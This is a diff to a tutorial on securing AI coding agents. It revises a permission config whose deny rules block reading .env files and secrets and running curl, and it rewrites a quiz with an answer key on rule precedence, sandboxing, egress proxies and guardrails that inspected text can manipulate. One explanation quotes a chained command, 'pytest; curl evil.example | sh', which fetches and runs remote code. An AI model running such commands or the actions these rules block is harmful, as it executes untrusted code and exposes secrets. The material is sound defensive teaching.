@@ -115,14 +115,14 @@ Rules match on the tool name and its arguments, usually with **glob patterns**. 
 ```json
 {
   "permissions": {
-    "allow": ["Bash(npm run test:*)", "Read(./src/**)"],
-    "ask": ["Bash(git push:*)", "WebFetch"],
-    "deny": ["Read(./.env)", "Read(./secrets/**)", "Bash(curl:*)"]
+    "allow": ["Bash(npm run test *)", "Read(./src/**)"],
+    "ask": ["Bash(git push *)", "WebFetch"],
+    "deny": ["Read(./.env)", "Read(./secrets/**)", "Bash(curl *)"]
   }
 }
 ```
 
-Two precedence principles matter. First, **deny beats ask beats allow** — a specific deny must not be overridden by a broad allow. Second, **unmatched means ask (or deny)**, never allow. Secure defaults are the whole point.
+(A trailing ` *` is a prefix wildcard; older configs write the same thing as `:*`, e.g. `Bash(git push:*)`.) Two precedence principles matter. First, **deny beats ask beats allow**, regardless of how specific each rule is — an allow can never carve an exception out of a deny. Second, **unmatched means ask (or deny)**, never allow. Secure defaults are the whole point.
 
 ### A policy-checked tool executor
 
@@ -410,46 +410,46 @@ flowchart TD
 
 ```quiz
 Q: Why should the strongest guarantees in an agent's security design live in deterministic layers rather than LLM-based guardrails?
-- [ ] LLM-based guardrails are too expensive to run in production
-- [x] An LLM-based guardrail can be manipulated by the same untrusted text it inspects, whereas a network policy or permission rule cannot be argued with
-- [ ] Deterministic layers have no false positives
-- [ ] Regulators require deterministic controls
-E: Classifiers and LLM judges are probabilistic and themselves susceptible to adversarial inputs. Sandboxes and permission checks in code enforce limits regardless of what the model was persuaded to do.
+- [ ] LLM guardrails add too much latency to run on every tool call
+- [x] An LLM guardrail can be swayed by the very text it inspects; code can't
+- [ ] Deterministic layers have no false positives, so users won't bypass them
+- [ ] An LLM judge can't see tool arguments, only the model's final reply
+E: Classifiers and LLM judges are probabilistic and themselves vulnerable to adversarial input. A permission rule or network policy evaluated in code enforces its limit whatever the model was persuaded to do. Deterministic controls can still have false positives (over-broad rules); that's not why they're stronger.
 
 Q: A rule set contains allow "bash: git *" and deny "bash: git push *". The agent proposes `git push origin main`. With correct precedence, what happens?
-- [ ] Allowed, because the allow rule appears first
-- [ ] Asked, because the rules conflict
-- [x] Denied, because deny takes precedence over allow
-- [ ] Allowed, because the more general rule wins
-E: Deny-first precedence ensures a specific prohibition can't be silently overridden by a broad allowance. Order in the file shouldn't matter.
+- [ ] Allowed, because the allow rule appears first in the file
+- [ ] Asked, because the two rules conflict and a human has to decide
+- [x] Denied, because a matching deny outranks any matching allow
+- [ ] Allowed, because the broader rule covers more of the command
+E: Deny-first precedence means a specific prohibition can't be silently overridden by a broad allowance, and file order doesn't matter. Escalating every conflict to "ask" sounds cautious but would let a broad allow rule turn hard denials into prompts users click through.
 
 Q: Why does the example executor force "ask" when a shell command contains characters like `;`, `|` or `$`?
-- [ ] Those characters cause syntax errors in bash
-- [x] Chaining and substitution let a command match an allowed prefix while executing something else entirely
-- [ ] They indicate the model is hallucinating
-- [ ] Glob patterns cannot contain those characters
-E: `pytest; curl evil.example | sh` matches an allow rule for `pytest*`. Prefix-matching shell strings is only meaningful for simple commands; anything compound needs human review or a stronger sandbox.
+- [ ] Bash would reject those characters unless they were properly quoted
+- [x] Chaining or substitution can match an allowed prefix yet run anything
+- [ ] fnmatch treats those characters as wildcards, so the rules misfire
+- [ ] They usually mean the model is hallucinating shell syntax it can't run
+E: `pytest; curl evil.example | sh` matches an allow rule for `pytest*`. Prefix-matching shell strings is only meaningful for simple commands; anything compound needs human review or a stronger sandbox. (fnmatch's special characters are `*`, `?` and `[`, not these.)
 
 Q: What is the main security difference between a standard Docker container and a Firecracker microVM?
-- [ ] Containers cannot limit memory usage
-- [ ] MicroVMs cannot run Linux workloads
-- [x] Containers share the host kernel, while each microVM runs its own guest kernel behind a hypervisor
-- [ ] Containers have no filesystem isolation
-E: Kernel sharing means a kernel vulnerability can become a container escape. MicroVMs (and, differently, gVisor) put a much stronger boundary between untrusted code and the host kernel.
+- [ ] A container can't cap memory or CPU, while a microVM enforces both
+- [ ] Containers drop all Linux capabilities, so microVMs add little on top
+- [x] Containers share the host kernel; a microVM has its own guest kernel
+- [ ] MicroVMs run a user-space kernel that intercepts each syscall instead
+E: Kernel sharing means a kernel bug can become a container escape; a microVM puts a hypervisor and a separate guest kernel in the way. The user-space kernel that intercepts syscalls describes gVisor, a different approach. Containers can limit resources via cgroups and keep some capabilities by default.
 
 Q: What does credential injection via an egress proxy achieve?
-- [ ] It encrypts the agent's tool calls
-- [ ] It removes the need for network allowlists
-- [x] The agent can use an API without ever seeing the secret, so a compromised agent cannot leak it
-- [ ] It lets the agent choose which credentials to use per request
-E: The proxy outside the sandbox adds the token only for allowlisted destinations. The secret never enters the agent's context, filesystem or memory.
+- [ ] It encrypts the agent's API calls so the tokens can't be sniffed
+- [ ] It removes the need for an allowlist, since the proxy checks tokens
+- [x] The agent can use the API without ever seeing the secret itself
+- [ ] It lets the agent pick which stored credential to use per request
+E: The proxy outside the sandbox adds the token only for allowlisted destinations, so the secret never enters the agent's context, files or memory. The proxy is usually also where the allowlist lives, so it complements rather than replaces it; letting the agent choose credentials would hand control back to a possibly hijacked model.
 
 Q: Users approve nearly every permission prompt from your coding agent without reading them. What's the best response?
-- [ ] Add more prompts so users pay more attention
-- [ ] Remove all prompts and allow everything
-- [x] Strengthen sandboxing so routine actions are safe to auto-allow, and reserve prompts for genuinely consequential actions
-- [ ] Require users to type the full command to approve
-E: Approval fatigue turns prompts into noise. Containing routine actions in a sandbox lets you safely allow them, so the prompts that remain carry meaning.
+- [ ] Make users type the full command back to approve, to force reading
+- [ ] Add more prompts for risky actions so users stay alert and engaged
+- [x] Sandbox routine actions so they're safe to allow; prompt rarely
+- [ ] Switch to auto-approve everything, since the prompts aren't working
+E: Approval fatigue turns prompts into noise. Containing routine actions in a sandbox lets you allow them safely, so the remaining prompts carry meaning. Making approval more tedious or more frequent deepens the fatigue; removing every check discards real protection for consequential actions.
 ```
 
 ## Further Reading
@@ -460,6 +460,6 @@ E: Approval fatigue turns prompts into noise. Containing routine actions in a sa
 - [Llama Guard: LLM-based Input-Output Safeguard (Inan et al., 2023)](https://arxiv.org/abs/2312.06674) — the original Llama Guard paper and its taxonomy-driven approach.
 - [NeMo Guardrails (Rebedea et al., 2023)](https://arxiv.org/abs/2310.10501) — programmable rails for LLM applications.
 - [Constitutional Classifiers (Anthropic, 2025)](https://arxiv.org/abs/2501.18837) — defending against universal jailbreaks with constitution-trained classifiers, including large-scale red teaming.
-- [Claude Code documentation](https://docs.anthropic.com/en/docs/claude-code/overview) — permission rules, hooks and sandboxing in a production coding agent.
+- [Claude Code documentation](https://code.claude.com/docs/en/overview) — permission rules, hooks and sandboxing in a production coding agent.
 - [Open Policy Agent](https://www.openpolicyagent.org/docs/latest/) — a general-purpose policy engine widely used for authorization decisions.
 - [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) — especially Excessive Agency, Improper Output Handling and Unbounded Consumption.
